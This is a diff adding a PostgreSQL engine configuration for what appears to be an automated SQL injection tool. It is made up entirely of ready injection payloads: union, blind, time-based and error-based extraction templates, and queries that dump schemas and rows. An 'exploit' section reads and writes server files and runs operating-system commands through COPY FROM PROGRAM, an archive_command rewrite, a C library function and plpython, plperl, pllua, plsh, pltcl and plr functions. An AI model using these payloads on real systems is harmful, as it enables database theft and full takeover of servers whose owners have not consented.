@@ -1,0 +1,345 @@
+engine: Postgres
+
+resource:
+ info: |
+  /* Method concat_ws exists since pg 9.1 only
+     concat_ws(
+         '${enclose_value_sql}',
+         version(),
+         current_database(),
+         user
+     ) */
+  version()
+  || '${enclose_value_sql}'
+  || current_database()
+  || '${enclose_value_sql}'
+  || user
+
+ schema:
+  database: |
+   select
+       array_to_string(
+           array(
+               select
+                   '${enclose_value_sql}'
+                   || r
+                   || '${separator_qte_sql}'
+                   || q::text
+                   || '${enclose_value_sql}'
+               from (
+                   select
+                       tables.table_schema r,
+                       count(table_name) q
+                   from information_schema.tables
+                   group by r
+                   order by r
+                   ${limit}
+               ) x
+           ),
+           '${separator_cell_sql}'
+       )
+
+  table: |
+   select
+       array_to_string(
+           array(
+               select
+                   '${enclose_value_sql}'
+                   || r
+                   || '${separator_qte_sql}'
+                   || q::text
+                   || '${enclose_value_sql}'
+               from (
+                   select
+                       tables.table_name r,
+                       '0' q
+                   from information_schema.tables
+                   where tables.table_schema = '${database}'
+                   order by r
+                   ${limit}
+               ) x
+           ),
+           '${separator_cell_sql}'
+       )
+
+  column: |
+   select
+       array_to_string(
+           array(
+               select
+                   '${enclose_value_sql}'
+                   || r
+                   || '${separator_qte_sql}'
+                   || q::text
+                   || '${enclose_value_sql}'
+               from (
+                   select
+                       columns.column_name r,
+                       '0' q
+                   from information_schema.columns
+                   where columns.table_schema = '${database}'
+                   and columns.table_name = '${table}'
+                   order by r
+                   ${limit}
+               )x
+           ),
+           '${separator_cell_sql}'
+       )
+
+  row:
+   query: |
+    select
+        array_to_string(
+            array(
+                select
+                    '${enclose_value_sql}'
+                    || r
+                    || '${separator_qte_sql}'
+                    || q::text
+                    || '${enclose_value_sql}'
+                from (
+                    select
+                        substr((${fields}), 1, 775) r,
+                        count(*) q
+                    from ${database}.${table}
+                    group by r
+                    ${limit}
+                )x
+            ),
+            '${separator_cell_sql}'
+        )
+   fields:
+    field: trim(coalesce(${field.value}::text, ''))
+    concat: "|| '%7f' ||"
+
+ exploit: |
+  # [contribute] share following exploit methodologies on GitHub to improve the app :
+  # - read and write files
+  # - UDF creation
+  # - RCE
+  
+  file:
+    read:
+      fromDataFolder: pg_read_file('${filepath}')
+      largeObject:
+        fromPath: select lo_import('%s')::text
+        toText: select convert_from(lo_get(%s),'utf8')::text
+      fromTempTable: array_to_string(array(select * from %s),'\n')
+  
+    write:
+      largeObject:
+        fromText: select lo_from_bytea(0, '%s')::text
+        toFile: select lo_export(%s, '%s')::text
+      tempTable:
+        drop: ; drop table %s
+        add: ; create table %s(data text)
+        fill: ; copy %s(data) from '%s' delimiter E'\x01'
+  
+  udf:
+    program:
+      run: ; copy %s from program '%s'
+      getResult: array_to_string(array(select data from %s),'\n')
+    
+    archive:
+      getStatus: select current_setting('archive_mode')
+      getPathConf: select setting from pg_settings where name = 'config_file'
+      getConfLength: select length(convert_from(lo_get(%s),'utf8'))::text
+      putCmd: select lo_put(%s, %s, E'\narchive_command = \'%s > %s\'')::text
+      reloadConf: select pg_reload_conf()::text
+      getCmd: select current_setting('archive_command')
+      runWal: select pg_switch_wal()::text
+  
+    library:
+      loFromText: select lo_from_bytea(0, decode('%s','hex'))::text
+      loToFile: select lo_export(%s, '%s')::text
+      # type cstring required
+      dropFunc: ; drop function exec_cmd(cstring)
+      createFunction: ; create or replace function exec_cmd(cstring) returns text as '%s', 'pg_exec' language 'c' strict
+      runFunc: select exec_cmd('%s')
+  
+    extension:
+      create: ; create extension %s
+      languages: select array_to_string(array(select lanname from pg_language),'')
+    
+    # drop functions from library, sql and other extensions
+    dropFunc: ; drop function exec_cmd(text);drop function exec_cmd();drop function exec_cmd(cstring)
+    runFunc: select exec_cmd('%s')||'%s'
+    
+    plpython: |
+      ; create or replace function exec_cmd(cmd text) returns text as%%20$$%%0a
+        from subprocess import check_output as c%%0a
+        return c(cmd.split('%%20')).decode()%%0a
+      $$%%20language %s
+    
+    # extension name pllua but language name plluau
+    pllua: |
+      ; create function exec_cmd(cmd text) returns text language plluau as%20$$%0a
+        local handle = io.popen(cmd)%0a
+        local result = handle:read("*a")%0a
+        handle:close()%0a
+        return result%0a
+      $$
+
+    plperl: ; create or replace function exec_cmd(text) returns text as 'return `$_[0]`' language plperlu
+    plsh: ; create or replace function exec_cmd(text) returns text as '%23!/bin/sh%0a$1' language plsh
+    pltcl: ; create or replace function exec_cmd(text) returns text as 'eval exec%20"$1"' language pltclu
+    # failing on multiple args 'ls -l'
+    plr: ; create or replace function exec_cmd(cmd text) returns text as 'system2(cmd, stdout=TRUE, stderr=TRUE)' language plr
+    
+    sql:
+      dropTable: ; drop table if exists cmd_result
+      createTable: ; create table cmd_result (str text)
+      confirm:
+        # unused signature arg and return text to avoid function duplicate
+        addFunc: |
+          ; create or replace function exec_cmd(cmd text) returns void as%20$$%0a
+            copy cmd_result from program 'echo%20"13""37"'%0a
+          $$%20language sql
+        funcExists: select routine_name from information_schema.routines where routine_type = 'FUNCTION' and routine_name = 'exec_cmd'
+      resultCmd: select array_to_string(array(select str from cmd_result),'\n')||'%s'
+      runCmd: ; select exec_cmd('')
+      clean: ; delete from cmd_result
+      runFunc: |
+        ; create or replace function exec_cmd(cmd text) returns void as%%20$$%%0a
+          copy cmd_result from program '%s'%%0a
+        $$%%20language sql
+
+strategy:
+ configuration:
+  slidingWindow: |
+   select
+       /* Coalesce appends trail when end of string (${lead}${trail}).
+          TODO Cleaner lead (similar to 0+1) */
+       '${lead_pipe}'
+       || coalesce(
+           substr(
+               (${injection}),
+               ${window.char},
+               65536
+           ),
+           ''
+       )
+       || '${trail_sql}'
+  limit: limit 65536 offset ${limit.value}
+  failsafe: (1337${indice}7330%2b1)::text
+  calibrator: repeat('${calibrator_sql}', 1024)
+  limitBoundary: 0
+  endingComment: --+-
+  fingerprint:
+   errorMessage:
+    # Spring
+    - Unterminated string literal started at position \\d+ in SQL .*. Expected .* char
+    - Unterminated identifier started at position \\d+ in SQL .*. Expected .* char
+    - 'ERROR: syntax error at or near ".*"[\\r\\n]+  Position: \\d+'
+    - 'ERROR: syntax error at end of input[\\r\\n]+  Position: \\d+'
+    # Other
+    - "ERROR: unterminated quoted identifier at or near"
+    - "Query failed: ERROR:  unterminated quoted string at or near"
+    - function\\.pg
+    - cratedb
+    - cockroachdb
+    - enterprisedb
+    - greenplum
+    - opengauss
+    - postgres
+    - redshift
+    - timescaleDB
+    - yugabytedb
+   orderByErrorMessage:
+    # Collision with vertica
+    - (?<!Vertica.*)ORDER BY position 1337 is not in select list
+   engineSpecific: case when ${test} then split_part('a','',1)else'b'end='a'::text
+
+ union:
+  indices: union select ${indices}
+  capacity: (select '${lead_pipe}' || ${indice} || ${calibrator})
+  orderBy: order by 1337
+
+ binary:
+  test:
+   bit: |
+    /**
+     * true bit return bit, false bit return 0
+     * 8 & 8 = 8, 8 & 4 = 0
+     */
+    0 != (
+        ascii(
+            substr(
+                (${injection}),
+                ${window.char},
+                1
+            )
+        )
+        %26${bit}
+    )
+   bin: |
+    ascii(
+        substr(
+            (${injection}),
+            ${window.char},
+            1
+        )
+    )
+    %3E%3Dascii(chr(${mid.int}))
+   truthyBin:
+    - ascii(chr(97))%3E%3Dascii(chr(97))
+    - ascii(chr(97))%3E%3Dascii(chr(65))
+    - ascii(chr(97))%3E%3Dascii(chr(48))
+    - ascii(chr(98))%3E%3Dascii(chr(97))
+    - ascii(chr(98))%3E%3Dascii(chr(66))
+    - ascii(chr(49))%3E%3Dascii(chr(48))
+   falsyBin:
+    - ascii(chr(97))%3E%3Dascii(chr(98))
+    - ascii(chr(65))%3E%3Dascii(chr(97))
+    - ascii(chr(66))%3E%3Dascii(chr(98))
+    - ascii(chr(66))%3E%3Dascii(chr(97))
+    - ascii(chr(48))%3E%3Dascii(chr(65))
+    - ascii(chr(48))%3E%3Dascii(chr(49))
+  modeAnd: and
+  modeOr: or
+  blind: ${binary.mode} ${test}
+  time: |
+   ${binary.mode} ''=''
+   || (
+       select
+           case when ${test}
+           then ''
+           else pg_sleep(${sleep_time})
+       end
+   )
+
+ error:
+  method:
+  
+   - name: Cast:or
+     query: |
+      /* ERROR: invalid input syntax for type numeric: "<sqli>" */
+      or 1 = cast((
+          ${window}
+          )::text as numeric
+      )
+     capacity: 255
+     
+   - name: Cast:and
+     query: |
+      and 1 = cast((
+          ${window}
+          )::text as numeric
+      )
+     capacity: 255
+     
+   - name: Cast:none
+     query: |
+      cast((
+          ${window}
+          )::text as numeric
+      )
+     capacity: 255
+
+   - name: Cast:stack
+     query: |
+      ; select cast((
+          ${window}
+          )::text as numeric
+      )
+     capacity: 255
